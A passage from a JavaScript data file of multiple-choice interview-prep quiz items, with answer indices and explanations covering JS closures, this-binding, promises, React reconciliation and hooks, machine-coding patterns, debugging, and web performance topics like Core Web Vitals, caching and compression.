    { q: "What is the Temporal Dead Zone?", opts: ["A deleted variable", "The period between a let/const being hoisted and its declaration line — accessing throws ReferenceError", "A garbage collected variable", "A scope boundary"], correct: 1, explain: "let and const ARE hoisted but not initialized. From scope start until declaration, they are in the TDZ — inaccessible. This prevents the confusing undefined behavior of var." },
    { q: "What is the difference between const and Object.freeze()?", opts: ["They are identical", "const prevents reassignment. Object.freeze() prevents property mutation. const obj = {} still allows obj.x = 1.", "const deep freezes", "freeze prevents reassignment"], correct: 1, explain: "const locks the binding — the variable cannot point to a different object. But the object is still mutable: obj.name = 'changed' works. Object.freeze(obj) makes properties read-only (shallow)." },
    { q: "What does this print?\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0);\n}", opts: ["0, 1, 2", "3, 3, 3", "0, 0, 0", "undefined x3"], correct: 1, explain: "var is function-scoped — all callbacks close over the SAME i. By the time setTimeout fires, the loop is done and i is 3. Fix: use let (block-scoped, creates new i per iteration)." },
  ],
  'ji-closures': [
    { q: "What is a closure?", opts: ["A function with no parameters", "A function that retains access to variables from its outer scope even after the outer function returned", "A private class method", "A self-invoking function"], correct: 1, explain: "A closure forms when an inner function references variables from an outer scope. The inner function keeps those variables alive even after the outer function finishes." },
    { q: "What does this return?\nfunction makeAdder(x) {\n  return (y) => x + y;\n}\nconst add5 = makeAdder(5);\nadd5(3);", opts: ["undefined", "8", "5", "Error"], correct: 1, explain: "makeAdder(5) returns an arrow function closing over x=5. add5(3) executes with y=3, returning 5+3=8. Classic partial application via closure." },
    { q: "Do closures hold a reference or a copy of outer variables?", opts: ["A copy at creation time", "A live reference — closure sees the CURRENT value, not what it was when created", "A frozen snapshot", "Depends on type"], correct: 1, explain: "Closures capture a LIVE REFERENCE. This is why the var loop prints 3,3,3: all closures share the same i reference and see its final value." },
  ],
  'ji-this': [
    { q: "What are the four rules for 'this' binding?", opts: ["One rule: always the class", "Default (global/undefined in strict), Implicit (object.method()), Explicit (call/apply/bind), new (constructor)", "Arrow function rule only", "Lexical scope only"], correct: 1, explain: "1. Default: fn() standalone. 2. Implicit: obj.fn() binds obj. 3. Explicit: call/apply/bind. 4. new: creates new object. Arrow functions ignore all rules — lexical this from definition site." },
    { q: "What does this print?\nconst obj = { x: 42, getX() { return this.x; } };\nconst fn = obj.getX;\nconsole.log(fn());", opts: ["42", "undefined", "TypeError", "null"], correct: 1, explain: "Extracting a method loses its binding. fn() is standalone — this is undefined (strict) or window (non-strict). window.x is undefined. The implicit obj binding is lost." },
    { q: "const obj = { x: 10, getX: () => this.x };\nconsole.log(obj.getX()); — what prints?", opts: ["10", "undefined", "TypeError", "null"], correct: 1, explain: "Arrow function captures 'this' from where the object literal is DEFINED — the outer scope (global/module). The implicit obj binding is ignored. this.x in global scope is undefined." },
  ],
  'ji-prototype': [
    { q: "What is the prototype chain?", opts: ["A CSS pattern", "A chain of objects linked via [[Prototype]] — property lookup walks up the chain until found or reaches null", "A design pattern", "An inheritance keyword"], correct: 1, explain: "Every object has [[Prototype]]. Property lookup: object → its prototype → prototype's prototype → Object.prototype → null. This is how toString() is available on every object." },
    { q: "What does Object.create(proto) do?", opts: ["Copies all properties", "Creates a new object with proto as its [[Prototype]] — no constructor called", "Deep clones", "Creates a Proxy"], correct: 1, explain: "Object.create(proto): new object whose [[Prototype]] is set to proto. Inherits proto's properties via chain. Unlike new Constructor(), no constructor function is called." },
    { q: "What does 'class' syntax do under the hood?", opts: ["Creates real classes", "Syntactic sugar over prototypal inheritance — same prototype chain mechanics, cleaner syntax", "Isolated objects", "Enables multiple inheritance"], correct: 1, explain: "class Animal { speak() {} } is essentially function Animal() {} plus Animal.prototype.speak = function() {}. extends sets up the prototype chain. Runtime behavior is identical to ES5 patterns." },
  ],
  'ji-promises': [
    { q: "Promise.resolve(1).then(x=>x+1).then(x=>{throw new Error('oops')}).then(x=>x+1).catch(e=>e.message) — what resolves?", opts: ["2", "3", "'oops'", "Error"], correct: 2, explain: "1+1=2. Throw skips next .then (rejection propagates). .catch receives error, returns e.message = 'oops'. Chain resolves with 'oops'." },
    { q: "What is the Promise constructor anti-pattern?", opts: ["Using async/await", "Wrapping an already-Promise function in new Promise() unnecessarily", "Using .catch()", "Chaining .then()"], correct: 1, explain: "new Promise((res,rej) => fetch('/api').then(res).catch(rej)) is pointless — just return fetch('/api'). Only use new Promise() when wrapping callback-based APIs like setTimeout." },
    { q: "What is the difference between Promise.all and Promise.allSettled?", opts: ["Identical", "Promise.all rejects on first failure. Promise.allSettled waits for all, returns each outcome — never rejects.", "allSettled is faster", "Promise.all is deprecated"], correct: 1, explain: "Promise.all: fail-fast — one rejection = everything rejects. Promise.allSettled: waits for all, returns [{status:'fulfilled',value:...}, {status:'rejected',reason:...}]." },
  ],
  'ji-coercion': [
    { q: "What does == do differently from ===?", opts: ["== is faster", "== performs type coercion before comparing. === compares type AND value with no coercion.", "=== checks prototypes", "Identical for numbers"], correct: 1, explain: "'' == 0 is true. null == undefined is true. false == 0 is true. Always use ===. One valid use of ==: x == null catches both null AND undefined in one check." },
    { q: "What values are falsy in JavaScript?", opts: ["false, null, undefined only", "false, 0, -0, 0n, '', null, undefined, NaN", "false, null, undefined, [], {}", "false and 0 only"], correct: 1, explain: "Complete falsy list: false, 0, -0, 0n, '', null, undefined, NaN. Everything else is truthy — including [], {}, 'false', '0'. [] and {} being truthy surprises many." },
    { q: "What does NaN === NaN return?", opts: ["true", "false — NaN is the only value not equal to itself. Use Number.isNaN()", "TypeError", "undefined"], correct: 1, explain: "NaN !== NaN is unique in JavaScript. isNaN('hello') returns true (coerces first — misleading). Number.isNaN('hello') returns false (no coercion). Always use Number.isNaN() for reliable detection." },
  ],
  'ji-immutability': [
    { q: "What does Object.freeze() do to nested objects?", opts: ["Deep freezes everything", "Shallow freeze only — nested objects still mutable", "Throws error on nested", "Auto-deep freezes"], correct: 1, explain: "Object.freeze() is SHALLOW. Object.freeze({ nested: {x:1} }) — obj.nested = {} throws, but obj.nested.x = 99 works! For deep immutability: recursively freeze or use Immer." },
    { q: "How does Immer achieve immutability?", opts: ["Deep cloning everything", "Uses Proxy to let you write mutating code that produces a new immutable copy", "Uses Object.freeze internally", "Uses WeakMap"], correct: 1, explain: "Immer's produce() wraps state in a Proxy (draft). Write normal mutating code on draft. Immer records changes and creates new immutable copy. Original untouched. This is how Redux Toolkit createSlice works." },
  ],
  'ji-debounce': [
    { q: "What should debounce do?", opts: ["Call immediately", "Delay execution until N ms after the LAST call — resets timer on each call", "Call once per interval", "Queue all calls"], correct: 1, explain: "debounce(fn, 300): each call cancels previous timer and sets new 300ms timer. Only final call (after 300ms silence) executes fn. Use for: search input, form auto-save, resize handler." },
    { q: "How do you implement debounce from scratch?", opts: ["Use setTimeout directly", "Store timer in closure, clearTimeout on each call, setTimeout to schedule", "Use requestAnimationFrame", "Use Proxy"], correct: 1, explain: "function debounce(fn, delay) { let timer; return function(...args) { clearTimeout(timer); timer = setTimeout(() => fn.apply(this, args), delay); }; } — key: clearTimeout before setTimeout." },
  ],
  'ji-currying': [
    { q: "What is currying?", opts: ["A cooking technique", "Transforming f(a,b,c) into f(a)(b)(c) — chain of functions each taking one argument", "Partial application with all args", "Sorting algorithm"], correct: 1, explain: "curry(fn)(a)(b)(c) — each call takes one arg and returns next function until all args collected. Enables partial application: const add5 = curriedAdd(5)." },
    { q: "What does compose(f, g, h)(x) do?", opts: ["Runs independently", "f(g(h(x))) — applies right-to-left. h runs first, result to g, result to f.", "h(g(f(x)))", "Runs in parallel"], correct: 1, explain: "compose applies right-to-left: compose(f, g, h)(x) = f(g(h(x))). pipe() is left-to-right. pipe is more readable for data transformation pipelines." },
  ],

  // ── React Interview Round ──────────────────────────────────────
  'ri-reconciliation': [
    { q: "What is React reconciliation?", opts: ["Rendering to DOM directly", "Diffing new virtual DOM against previous to find minimal set of DOM changes needed", "Updating component state", "Hydrating server HTML"], correct: 1, explain: "Reconciliation: React builds new virtual DOM tree, diffs against previous tree using reconciliation algorithm, applies only actual changes to real DOM." },
    { q: "Why do stable keys matter in lists?", opts: ["CSS styling", "Keys let React identify which items changed/moved/removed — without stable keys, React may destroy and recreate components unnecessarily", "Required by JSX", "TypeScript typing"], correct: 1, explain: "Without stable keys, React cannot tell if item at position 2 is the same item or a new one. It may destroy and recreate DOM unnecessarily, losing component internal state." },
  ],
  'ri-fiber': [
    { q: "What problem did React Fiber solve?", opts: ["Slow virtual DOM diffing", "Rendering was synchronous and uninterruptible — long renders blocked main thread, causing dropped frames", "Memory leaks", "Large bundle sizes"], correct: 1, explain: "The old stack reconciler ran to completion — a 300ms render blocked everything including user input. Fiber breaks rendering into pauseable units, enabling Concurrent Mode." },
    { q: "What are the two phases of React rendering in Fiber?", opts: ["Mount and update", "Render phase (interruptible, builds fiber tree) and Commit phase (synchronous, applies DOM changes)", "Diffing and patching", "Creation and execution"], correct: 1, explain: "Render phase: React calls component functions and builds new fiber tree — pure, interruptible in Concurrent Mode. Commit phase: applies changes to real DOM — always synchronous and runs to completion." },
  ],
  'ri-useeffect': [
    { q: "What causes a stale closure in useEffect?", opts: ["Using async/await", "Effect captures variable at render time but deps array is empty — never re-runs, always reads old captured value", "Multiple effects", "Missing React import"], correct: 1, explain: "useEffect(() => { setInterval(() => setCount(count + 1), 1000); }, []) — count captured as 0 forever. setCount(0+1) every second stays at 1. Fix: setCount(c => c+1) functional updater." },
    { q: "When does useEffect cleanup run?", opts: ["Only on unmount", "Before the NEXT effect runs AND on unmount — runs every time the effect re-runs to prevent stale subscriptions", "After every render", "Only when deps change"], correct: 1, explain: "Cleanup runs: 1) Before next effect execution when deps change. 2) On component unmount. This ensures no stale subscriptions — each effect cleans up previous before setting up new." },
  ],
  'ri-context': [
    { q: "Why does Context cause unnecessary re-renders?", opts: ["Context is slow", "All consumers re-render when context value reference changes, even if only unrelated fields changed", "Context uses polling", "Context skips batching"], correct: 1, explain: "Context re-renders ALL consumers when value changes by reference. {user, theme, notifications} in one context — changing notifications re-renders components that only use user." },
    { q: "Best way to prevent Context re-renders?", opts: ["useCallback everywhere", "Split context by concern and memoize each provider value with useMemo", "Avoid Context entirely", "Use Redux instead"], correct: 1, explain: "Splitting: UserContext, ThemeContext, NotifContext — components only subscribe to what they use. useMemo(() => ({user, setUser}), [user]) prevents new references on every render." },
  ],
  'ri-hooks-rules': [
    { q: "Why can't you call hooks inside conditions or loops?", opts: ["Technical limitation only", "Hooks rely on call order — React uses indexed array. Conditional hooks change order, corrupting the state array.", "Performance reason", "TypeScript requires it"], correct: 1, explain: "React tracks hook state by call order. useState[0] is first hook, useState[1] is second. Skip a hook conditionally — all subsequent hooks read from wrong slot. State array shifts." },
    { q: "What are the two rules of Hooks?", opts: ["Only use in classes, only useState", "1. Only call at top level. 2. Only call from React functions (components or custom hooks).", "Use in any function", "Call in any order"], correct: 1, explain: "Rule 1: Call hooks at the top level — not inside conditions, loops, or nested functions. Rule 2: Only call from React function components or custom hooks." },
  ],
  'ri-batching': [
    { q: "What is automatic batching in React 18?", opts: ["React auto-chunks renders", "Multiple setState calls grouped into single re-render, even in setTimeout and Promises", "Auto-memoizes components", "Batches DOM writes"], correct: 1, explain: "React 18 extended batching to ALL contexts — setTimeout, Promises, native events. Previously only event handlers. Multiple setStates in async code = one re-render instead of one per call." },
    { q: "How do you opt out of batching in React 18?", opts: ["Cannot opt out", "flushSync(() => setState(...)) — forces synchronous DOM update immediately", "unstable_batchedUpdates()", "ReactDOM.flush()"], correct: 1, explain: "flushSync(() => setState(newValue)) forces React to flush and re-render synchronously. DOM updates immediately after flushSync returns. Use sparingly — mainly for integrating with non-React code." },
  ],
  'ri-custom-hooks': [
    { q: "What is a custom hook?", opts: ["Built-in React hook", "A function starting with 'use' that calls other hooks and encapsulates reusable stateful logic", "An event handler", "A class method"], correct: 1, explain: "A custom hook is any function starting with 'use' that calls React hooks internally. The 'use' prefix tells React's ESLint plugin to enforce rules of hooks within that function." },
    { q: "Why must custom hooks start with 'use'?", opts: ["JavaScript requires it", "React ESLint plugin uses it to enforce rules of hooks within that function", "Convention with no technical reason", "Enables TypeScript inference"], correct: 1, explain: "The 'use' prefix signals to react-hooks/rules-of-hooks ESLint rule that this function must follow hook rules. Without it, hooks inside can be called conditionally without linter catching it." },
  ],
  'ri-patterns': [
    { q: "When should you use HOC vs custom hook?", opts: ["HOC always", "Custom hooks for logic reuse (most cases). HOC when you need to wrap component in another component.", "Render props always", "Interchangeable"], correct: 1, explain: "Custom hooks: logic reuse without component nesting — modern default. HOC: when you need to wrap the component (withAuth, withLogging) — creates wrapper layers. Custom hooks replaced most HOC use cases." },
  ],
  'ri-concurrent': [
    { q: "What is useTransition used for?", opts: ["CSS transitions", "Marking state updates as non-urgent — React can interrupt them for urgent updates like user input", "Delaying API calls", "Creating animations"], correct: 1, explain: "useTransition: [isPending, startTransition]. Wrap non-urgent updates in startTransition. React prioritizes urgent work (typing) over transitions, which can be deferred. UI stays responsive." },
    { q: "What does useDeferredValue do?", opts: ["useCallback equivalent", "Returns a lagging copy of a value that updates when React has time — like a React-aware debounce", "useRef equivalent", "Same as useEffect"], correct: 1, explain: "useDeferredValue(value) is like React-aware debounce. Deferred value lags behind during high-priority renders. Use to show stale search results while computing new ones, keeping input responsive." },
  ],

  // ── Machine Coding Round (additional) ──────────────────────────
  'mc-autocomplete': [
    { q: "User types 'r','e','a','c','t' in 200ms. With debounce(300ms), how many API calls fire?", opts: ["5 — one per keystroke", "1 — after 300ms of silence", "2 — first and last", "0"], correct: 1, explain: "Each keystroke resets the 300ms timer. After 't', 300ms silence passes → exactly ONE request fires for 'react'." },
    { q: "What race condition must autocomplete handle?", opts: ["Two users typing", "Older response arriving after newer — 'rea' response overwrites 'react' results", "API rate limiting", "Keyboard conflicts"], correct: 1, explain: "User types fast: requests for 'r','re','rea'. If 'rea' response arrives after 'react' response, it shows wrong results. Fix: AbortController cancels previous request on each new keystroke." },
  ],
  'mc-infinite-scroll': [
    { q: "What API is best for detecting viewport entry?", opts: ["scroll event listener", "IntersectionObserver — off-main-thread, fires only at threshold, handles nested scrollers", "getBoundingClientRect in setTimeout", "ResizeObserver"], correct: 1, explain: "IntersectionObserver runs off-main-thread, fires only when threshold is crossed (not every scroll pixel), handles nested scroll containers, requires zero math." },
    { q: "How do you handle errors without losing loaded items?", opts: ["Reset to page 1", "Show error below existing items with Retry button — preserve all loaded data", "Full page error", "Reload page"], correct: 1, explain: "Never clear existing items on error. Keep loaded data visible, show error at bottom: 'Failed to load more. [Retry]'. On retry, attempt same page number. Netflix/Twitter pattern." },
  ],
  'mc-modal': [
    { q: "Why use React Portal for modals?", opts: ["Better performance", "Modals inside nested components inherit parent CSS (overflow:hidden, z-index) — portaling to document.body escapes all constraints", "Easier animations", "Required for accessibility"], correct: 1, explain: "A modal inside overflow:hidden gets clipped. Portal renders DOM inside document.body, outside any CSS constraints. React event bubbling still works through the React tree." },
    { q: "What must happen to focus when a modal closes?", opts: ["Focus goes to body", "Return focus to the element that triggered the modal", "Focus first link on page", "Focus is cleared"], correct: 1, explain: "Save document.activeElement before opening. After modal closes, call savedElement.focus(). Without this, keyboard users lose their place — focus disappears or lands somewhere unexpected." },
  ],
  'mc-virtual-list': [
    { q: "What problem does virtual scrolling solve?", opts: ["Slow network requests", "Rendering 10,000 DOM nodes causes jank — virtual scrolling renders only ~20 visible items regardless of total size", "CSS performance", "Memory leaks"], correct: 1, explain: "Each DOM node has memory, style recalculation, and paint cost. 10,000 items = seconds of rendering. Virtual scrolling maintains a fixed DOM window (~20-30 items) that moves as user scrolls." },
    { q: "What is overscan?", opts: ["Scanning beyond viewport", "Rendering extra items above/below visible area to prevent blank flashes during fast scrolling", "Overriding scroll behavior", "Pre-fetching data"], correct: 1, explain: "Without overscan: fast scrolling outpaces rendering, showing blank areas. Overscan renders 3-5 extra items above/below viewport. Users see them as they scroll in — eliminates blank flash." },
  ],
  'mc-toast': [
    { q: "What accessibility attribute is critical for toasts?", opts: ["aria-hidden", "aria-live='polite' — screen readers announce new toasts without interrupting", "tabIndex=0", "aria-disabled"], correct: 1, explain: "Toast container: aria-live='polite' aria-atomic='true'. Announces new content to screen readers when user is idle. For errors: role='alert' announces immediately (assertive)." },
    { q: "How do you animate toasts OUT without React removing DOM immediately?", opts: ["display:none toggle", "Mark as 'exiting', play CSS animation, call actual removal in onAnimationEnd", "setTimeout matching animation", "opacity only"], correct: 1, explain: "React removes DOM on state change — exit animations need a delay. Pattern: setExiting(true) → CSS animation plays → onAnimationEnd → remove from state array." },
  ],
  'mc-kanban': [
    { q: "How do you implement optimistic updates in Kanban?", opts: ["Wait for server", "Move card immediately, send API, revert to snapshot on failure", "Disable while saving", "Show spinner"], correct: 1, explain: "Optimistic: 1) Snapshot board state. 2) Apply move immediately. 3) Send API call. 4) On success: nothing. 5) On failure: restore snapshot + show error toast. Users never wait for the server." },
  ],
  'mc-multistep-form': [
    { q: "Where should multi-step form state live?", opts: ["Each step manages own", "In parent component or shared useForm — all steps share one state for review step", "localStorage", "URL params"], correct: 1, explain: "Lifting state to parent enables: review step, conditional steps, cross-step validation, draft saving. React Hook Form supports multi-step with single useForm instance shared via FormProvider." },
    { q: "How do you validate each step before advancing?", opts: ["HTML required only", "Call trigger(['field1','field2']) for current step's fields — advance only if valid", "Validate on final submit", "Disable Next always"], correct: 1, explain: "RHF: const isValid = await trigger(['email', 'password']). If true, increment step. Validates only current step without submitting. Shows per-step errors while preventing invalid advancement." },
  ],
  'mc-rbac': [
    { q: "Why must authorization also be enforced server-side?", opts: ["Not needed", "Frontend RBAC is cosmetic — users can bypass via DevTools or direct API calls. Server must verify every request.", "For performance", "For logging only"], correct: 1, explain: "Any user can open DevTools, remove admin check, see UI. Or call API directly with valid JWT. Server must check: does this JWT's role have permission? Frontend RBAC = UX only. Backend RBAC = security." },
    { q: "How do you implement a Can component for permission hiding?", opts: ["Always render with opacity:0", "Component that only renders children if user has required permission — null otherwise", "CSS pointer-events:none", "Conditional with user.role==='admin'"], correct: 1, explain: "function Can({ permission, children }) { return user?.permissions?.includes(permission) ? children : null; } — centralizes permission logic. <Can permission='delete_user'><DeleteButton /></Can>." },
  ],

  // ── Debugging Round ──────────────────────────────────────────
  'db-react-renders': [
    { q: "First tool to find unnecessary re-renders?", opts: ["console.log in render", "React DevTools Profiler — 'Why did this render?' shows exact cause", "Chrome Performance", "Network tab"], correct: 1, explain: "React DevTools Profiler: record interaction → click component → see 'Why did this render?' with exact prop/state/context that changed. No guesswork needed." },
    { q: "React.memo component still re-renders on every parent render. Why?", opts: ["React.memo broken", "A prop is new object/function reference created inline each parent render — memo does reference equality", "Child has state", "React 18 changed memo"], correct: 1, explain: "React.memo does shallow comparison. <Child config={{color:'red'}} /> creates new {} on every parent render. Memo sees different reference each time → re-renders. Fix: useMemo for objects, useCallback for functions." },
  ],
  'db-memory-leak': [
    { q: "What Chrome DevTools panel detects memory leaks?", opts: ["Network panel", "Performance Monitor — watch JS Heap Size. Continuous upward slope = leak. Healthy = sawtooth.", "Sources panel", "Application panel"], correct: 1, explain: "Performance Monitor (More Tools → Performance Monitor): watch JS Heap Size over interactions. Healthy: grows then drops on GC. Leaking: steadily grows, never fully drops." },
    { q: "Most common React memory leak cause?", opts: ["Using useState", "Event listeners/subscriptions in useEffect without cleanup — hold component references", "Large state objects", "Too many components"], correct: 1, explain: "useEffect(() => { window.addEventListener('resize', handler); }, []) — no cleanup. On unmount, handler still references component via closure. Fix: return () => window.removeEventListener('resize', handler)." },
  ],
  'db-network': [
    { q: "What does TTFB measure?", opts: ["Total transfer time", "Time from request sent to first byte received — high TTFB = slow server processing or no CDN", "DNS lookup time only", "TCP handshake time"], correct: 1, explain: "TTFB > 600ms indicates server-side problems: slow database queries, expensive computations, cold serverless starts, or physical distance to server (no CDN). Separate from download time." },
    { q: "Long yellow bar in Network waterfall means?", opts: ["Slow download", "Waiting (TTFB) — server is processing. Yellow = waiting, blue = downloading content", "DNS lookup", "SSL handshake"], correct: 1, explain: "Waterfall colors: gray = stalled, yellow = waiting/TTFB, blue = content download. Long yellow + short blue = server bottleneck. Long blue + short yellow = large file." },
  ],
  'db-performance': [
    { q: "How do you read a flame chart?", opts: ["Server temperature", "Top-down call stack where width = time. Widest block at deepest level = bottleneck.", "Network timeline", "Memory visualization"], correct: 1, explain: "Flame chart: each row = call stack level. Width proportional to time. Find the widest block at the deepest level — that's the actual bottleneck. Everything above it is just the call chain." },
    { q: "What is a Long Task?", opts: ["Task > 10ms", "JS task blocking main thread > 50ms — prevents browser responding to input, causes jank", "Network request > 1s", "Task using > 10MB"], correct: 1, explain: "Long Tasks (>50ms) block user input — clicks/scrolls queue while they run. Shown in red in Performance panel. Break them up with scheduler.yield() or setTimeout(0) between chunks." },
  ],
  'db-hydration': [
    { q: "What causes hydration mismatch?", opts: ["Slow server", "Server HTML doesn't match client render — Date.now(), window, Math.random() differ between server and client", "Missing CSS", "Network errors"], correct: 1, explain: "Hydration compares server HTML to client React tree. Common causes: Date.now(), window checks without guards, CSS-in-JS class differences, browser extensions injecting DOM nodes." },
    { q: "How do you fix browser-only API hydration issues?", opts: ["suppressHydrationWarning everywhere", "Use useEffect to read browser values after mount — server renders null/default, client updates after hydration", "Wrap in try/catch", "Check process.env"], correct: 1, explain: "function Component() { const [w, setW] = useState(0); useEffect(() => setW(window.innerWidth), []); return <div>{w}</div>; } — server renders 0, client updates after mount. No mismatch." },
  ],
  'db-production': [
    { q: "How do source maps help debug production errors?", opts: ["Make code larger", "Map minified positions back to original source — 'bundle.min.js:1:45823' becomes 'UserProfile.tsx:42'", "Development only", "Slow down production"], correct: 1, explain: "Without source maps: 'TypeError at bundle.min.js:1:45823'. With source maps (uploaded to Sentry): 'TypeError at src/components/UserProfile.tsx:42'. Upload privately — Sentry symbolicates server-side." },
    { q: "A bug only reproduces in production. First step?", opts: ["Deploy debug build", "Check error monitoring for exact error, stack trace, user context, browser/OS — reproduce with same conditions", "Roll back", "Ask user to record"], correct: 1, explain: "Production-only bugs: 1) Different env vars. 2) Build differences (minification, tree shaking). 3) Specific user data. Error monitoring with user context and session data narrows it down fast." },
  ],
  'db-stale-closure': [
    { q: "What is a stale closure?", opts: ["Stopped component", "A useEffect or callback that captured outdated variable — reads old state instead of current value", "Uncleaned listener", "Memory leak"], correct: 1, explain: "useEffect(() => { setInterval(() => console.log(count), 1000); }, []) — count captured as initial value (0) forever. Every interval fires with count=0 despite state updating." },
    { q: "What is the functional updater pattern?", opts: ["Always use it", "setCount(c => c+1) — receives latest state as c regardless of closure. Use when new state depends on previous in async callbacks.", "Only in useReducer", "Complex state only"], correct: 1, explain: "setCount(c => c+1): React passes most recent state as c — regardless of closure. Essential in setInterval, setTimeout, async callbacks where closure may be stale." },
  ],

  // ── Performance Interview Round ──────────────────────────────────────
  'pi-cwv': [
    { q: "What are the three Core Web Vitals?", opts: ["FCP, TTI, TBT", "LCP (loading), INP (interactivity), CLS (visual stability) — affect SEO rankings", "TTFB, FID, Speed Index", "PageSpeed, Lighthouse, WebPageTest"], correct: 1, explain: "LCP: Largest Contentful Paint — when main content appears (<2.5s good). INP: Interaction to Next Paint — response to input (<200ms). CLS: Cumulative Layout Shift — unexpected movement (<0.1)." },
    { q: "LCP 3.8s. Hero is CSS background-image. Fix?", opts: ["Convert to WebP", "Replace with <img> + <link rel='preload'> — CSS background images discovered late after CSS downloads", "Add loading='eager'", "Compress more"], correct: 1, explain: "CSS background images: HTML → CSS download → CSS parse → find image URL → download. Three blocking steps. <img> + preload starts download during HTML parse. Biggest LCP improvement." },
  ],
  'pi-bundle': [
    { q: "What is the difference between tree shaking and code splitting?", opts: ["Same thing", "Tree shaking: removes unused exports at build time. Code splitting: breaks bundle into on-demand chunks at runtime.", "Tree shaking is for CSS", "Code splitting is CSS"], correct: 1, explain: "Tree shaking: static analysis removes exports nobody imports — build time, reduces bundle. Code splitting: separate chunks loaded when needed — runtime, reduces initial load." },
    { q: "Bundle analyzer shows moment.js at 67KB. You use one date format. Fix?", opts: ["Compress moment", "Replace with date-fns: import { format } from 'date-fns' — tree-shakeable, ~2KB vs always-67KB", "Lazy load moment", "Import only locale"], correct: 1, explain: "moment.js is CJS — not tree-shakeable. Any import includes all 67KB. date-fns is ESM — import { format } adds only ~2KB. One of the highest-ROI bundle optimizations." },
  ],
  'pi-images': [
    { q: "Why never add loading='lazy' to the LCP image?", opts: ["Lazy loading is bad", "Lazy loading defers download until near viewport — LCP image IS in viewport. Directly worsens LCP score.", "Causes CLS", "Breaks Safari"], correct: 1, explain: "loading='lazy' means: don't download until near viewport. For above-fold hero image already in viewport, this adds unnecessary delay. Use fetchpriority='high' on the LCP image instead." },
    { q: "What does srcset solve?", opts: ["Multiple fallbacks", "Provides size variants — browser picks optimal size for screen width and DPR. Mobile downloads small version.", "SEO only", "Responsive layouts only"], correct: 1, explain: "<img srcset='hero-400.webp 400w, hero-800.webp 800w' sizes='(max-width:640px) 400px, 800px'> — browser calculates viewport × DPR → picks smallest sufficient version." },
  ],
  'pi-lighthouse': [
    { q: "TBT=850ms (red), LCP=2.1s (green), CLS=0.05 (green). Focus first?", opts: ["LCP — most important", "TBT — 30% score weight and red. Reducing long JS tasks gives biggest score improvement.", "CLS always first", "All equally"], correct: 1, explain: "TBT has highest weight (30%) and is in the red. LCP is passing. CLS excellent. Fixing long tasks (code splitting, lazy loading, yield) gives most dramatic score improvement." },
    { q: "Lighthouse vs CrUX — what is the difference?", opts: ["Same", "Lighthouse: synthetic test on your machine. CrUX: real Chrome users worldwide on actual devices/networks.", "CrUX more accurate for your machine", "Lighthouse uses real data"], correct: 1, explain: "Lighthouse runs on your fast dev machine (even with throttling). CrUX is 28 days real Chrome users — P75. A page can score 95 Lighthouse but fail for real mobile users on 3G." },
  ],
  'pi-caching': [
    { q: "max-age=3600 vs no-cache — difference?", opts: ["no-cache means never cache", "max-age=3600: serve from cache for 1 hour, no network. no-cache: always revalidate but may use cache if server returns 304.", "Same", "no-cache is for private data"], correct: 1, explain: "max-age=3600: browser serves cached version for 3600s — zero network requests. no-cache: must check server every time (ETag/If-None-Match), server can respond 304 (use your cache) — fast but always validates." },
    { q: "Best caching strategy for content-hashed JS assets?", opts: ["Cache-Control: no-cache", "Cache-Control: max-age=31536000, immutable — cache forever, hash changes when content changes so URL changes", "Cache-Control: max-age=3600", "ETags only"], correct: 1, explain: "Content-hash filenames: same URL = same content = safe to cache forever. New deploy = new hash = new URL = browser fetches fresh. immutable skips revalidation even on Ctrl+F5." },
  ],
  'pi-rendering': [
    { q: "Marketing page, changes weekly. Best strategy?", opts: ["SSR — freshest", "SSG — build once, CDN-served, fastest possible for rarely-changing content", "CSR — simplest", "ISR with revalidate=60"], correct: 1, explain: "SSG: built at deploy time → CDN edge → zero server computation per request → fastest TTFB (<50ms). For weekly-changing content, SSG + rebuild on change or ISR with long revalidate is optimal." },
    { q: "When is SSR better than SSG?", opts: ["Always — fresher is better", "When content is user-specific (dashboard) or changes more frequently than you can rebuild", "Never", "Only for auth pages"], correct: 1, explain: "SSR: personalized pages, real-time data, auth-gated content. 1000 users get 1000 different pages — SSG can't pre-render all combinations. SSR or CSR after auth is the right choice." },
  ],
  'pi-compression': [
    { q: "Gzip vs Brotli — which is better?", opts: ["Identical", "Brotli: 15-25% better compression. Gzip: universal support, faster. Pre-compress static assets with Brotli at build time.", "Gzip better for JS", "Brotli only for images"], correct: 1, explain: "300KB JS: Gzip → ~100KB, Brotli → ~80KB. Brotli compresses ~15-25% better. All modern browsers support Brotli. Pre-compress at build time (it is slow) and serve pre-compressed files directly from server." },
    { q: "How does HTTP/2 multiplexing help?", opts: ["Compresses more", "Multiple requests over ONE connection simultaneously — eliminates 6-connection limit and request queuing", "Faster for large files only", "Removes need for CDNs"], correct: 1, explain: "HTTP/1.1: max 6 parallel connections per domain. 20 assets queue in groups of 6. HTTP/2: one TCP connection, multiplexes all 20 simultaneously as binary frames. No queuing." },
  ],

  // ── Rapid Fire ──────────────────────────────────────────────
  'rf-debounce-throttle': [
    { q: "Debounce vs throttle — key difference?", opts: ["Debounce is faster", "Debounce: fires once after activity stops. Throttle: fires at most once per interval.", "Same", "Throttle waits for silence"], correct: 1, explain: "Debounce: waits for pause — use for search input, auto-save. Throttle: limits rate — fires then blocks for N ms — use for scroll, resize handlers." },
  ],
  'rf-event-loop-1min': [
    { q: "Event loop in one sentence?", opts: ["Loops through events", "Run sync code, drain all microtasks (Promises), run one macrotask (setTimeout), repeat", "Handles async requests", "Manages the DOM"], correct: 1, explain: "Order: 1) Sync code. 2) ALL microtasks (Promise.then, async/await). 3) ONE macrotask (setTimeout). 4) Repeat. This is why Promise always runs before setTimeout(fn, 0)." },
  ],
  'rf-closure': [
    { q: "What is a closure in one sentence?", opts: ["A private function", "A function that remembers variables from its outer scope even after that scope finished executing", "An IIFE", "A module pattern"], correct: 1, explain: "Closure: inner function references outer scope variables, keeping them alive. The inner function 'closes over' those variables — they persist even after outer function returns." },
  ],
  'rf-hoisting': [
    { q: "What is hoisting?", opts: ["Moving code to bottom", "JS moves declarations to top of scope — var as undefined, functions fully, let/const in TDZ", "Runtime optimization", "Module loading"], correct: 1, explain: "Hoisting: engine registers var (as undefined) and function declarations (fully) before executing any code. let/const hoisted but not initialized (TDZ). Functions can be called before they appear in code." },
  ],
  'rf-map-foreach': [
    { q: "map vs forEach — key difference?", opts: ["map is faster", "map returns new array with transformed values. forEach returns undefined — side effects only, cannot chain.", "forEach is newer", "Identical"], correct: 1, explain: "map: transforms each element → returns new array. Can chain: [1,2,3].map(x=>x*2).filter(x=>x>2). forEach: returns undefined — cannot chain. Use map when you need the resulting array." },
  ],
  'rf-memoization': [
